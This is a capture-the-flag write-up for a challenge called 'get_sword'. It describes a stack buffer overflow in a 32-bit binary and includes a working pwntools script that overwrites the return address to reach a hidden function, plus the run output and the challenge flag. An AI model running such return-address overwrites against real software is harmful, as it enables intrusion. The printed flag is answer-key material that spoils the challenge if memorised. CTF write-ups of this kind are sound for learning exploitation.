## Quest Details:

![[6.1.0.png]]
## Files:

get_sword ![[get_sword]]
## Steps:

1. Connect to ```nc 173.255.201.51 31337``` on bind shell using netcat

2. Run the binary
`$ file ./get_sword` 
`./get_sword: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=4a9b260935bf815a04350e3bb9e0e4422f504b2a, for GNU/Linux 4.4.0, not stripped`

You can see that the function `intro/0x8049256` has a stack buffer overflow with `scanf` and `%s`. There are 0x20 bytes on the stack before the return address.

You can see that there is a function called `getSword/0x8049218` which concatenates the flag.

3. Craft and run the exploit python file

```
from pwn import *

GET_SWORD = 0x08049219

#p = process("./get_sword")
p = remote("173.255.201.51", 31337)
#gdb.attach(p, gdbscript="")

p.readuntil(b"What do you want ? ?: ")

payload = b"A" * 0x20
payload += p32(GET_SWORD)
p.sendline(payload)

p.interactive()
```

```
$ python3 ./go.py 
[+] Opening connection to 173.255.201.51 on port 31337: Done
[*] Switching to interactive mode
KCTF{so_you_g0t_the_sw0rd}
You want, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x19\x04
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to 173.255.201.51 port 31337
```

## Flag: KCTF{so_you_g0t_the_sw0rd}